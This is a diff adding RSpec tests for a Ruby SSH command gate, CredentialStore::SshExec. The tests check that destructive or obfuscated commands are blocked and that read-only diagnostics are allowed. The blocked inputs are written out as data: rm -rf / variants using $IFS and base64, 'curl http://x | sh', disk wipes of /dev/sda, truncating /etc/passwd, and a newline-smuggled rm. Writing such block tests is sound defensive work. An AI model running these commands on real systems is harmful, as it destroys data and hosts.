@@ -321,6 +321,86 @@ RSpec.describe CredentialStore::SshExec do
     expect(runner).not_to have_received(:call)
   end
 
+  it "requires explicit allowance for shell expansion and destructive command variants" do
+    credential = create_credential
+    allow(runner).to receive(:call)
+
+    [
+      'rm${IFS}-rf${IFS}/',
+      %q($'\x72m' -rf /),
+      "{rm,-rf,/}",
+      "/bin/r? -rf /",
+      "echo cm0gLXJmIC8= | base64 -d | sh",
+      "curl http://x | sh",
+      "poweroff",
+      "halt",
+      "systemctl poweroff",
+      "find / -delete",
+      "shred /dev/sda",
+      "wipefs -a /dev/sda",
+      "fdisk /dev/sda",
+      "truncate -s0 /etc/passwd",
+      "kill -9 1",
+      "killall worker",
+      "userdel deploy",
+      "passwd deploy",
+      "cat /dev/zero > /dev/sda"
+    ].each do |command|
+      expect {
+        described_class.call(context: context, credential: credential.id, host: "app.example.com", user: "deploy", command: command)
+      }.to raise_error(CredentialStore::SshExec::RiskyCommand, /requires explicit/), command
+    end
+
+    expect(runner).not_to have_received(:call)
+  end
+
+  it "allows read-only diagnostic commands and pipelines without explicit allowance" do
+    credential = create_credential
+    allow(runner).to receive(:call).and_return(CredentialStore::SshRunner::Result.new(stdout: "", stderr: "", status: 0))
+
+    [
+      "uptime",
+      "df -h && free -m",
+      "ps aux | grep worker",
+      "command uptime",
+      "ls -la /tmp"
+    ].each do |command|
+      expect {
+        described_class.call(context: context, credential: credential.id, host: "app.example.com", user: "deploy", command: command)
+      }.not_to raise_error
+    end
+
+    expect(runner).to have_received(:call).exactly(5).times
+  end
+
+  it "defaults commands outside the read-only allowlist to requiring explicit allowance" do
+    credential = create_credential
+    allow(runner).to receive(:call)
+
+    expect {
+      described_class.call(context: context, credential: credential.id, host: "app.example.com", user: "deploy", command: "deploy-app")
+    }.to raise_error(CredentialStore::SshExec::RiskyCommand, /requires explicit/)
+
+    expect(runner).not_to have_received(:call)
+  end
+
+  it "requires explicit allowance for execution context modifiers" do
+    credential = create_credential
+    allow(runner).to receive(:call)
+
+    [
+      "LD_PRELOAD=/tmp/library.so uptime",
+      "sudo uptime",
+      "uptime\nrm -rf /"
+    ].each do |command|
+      expect {
+        described_class.call(context: context, credential: credential.id, host: "app.example.com", user: "deploy", command: command)
+      }.to raise_error(CredentialStore::SshExec::RiskyCommand, /requires explicit/), command
+    end
+
+    expect(runner).not_to have_received(:call)
+  end
+
   it "treats unparseable command strings as risky before invoking the runner" do
     credential = create_credential
     allow(runner).to receive(:call)
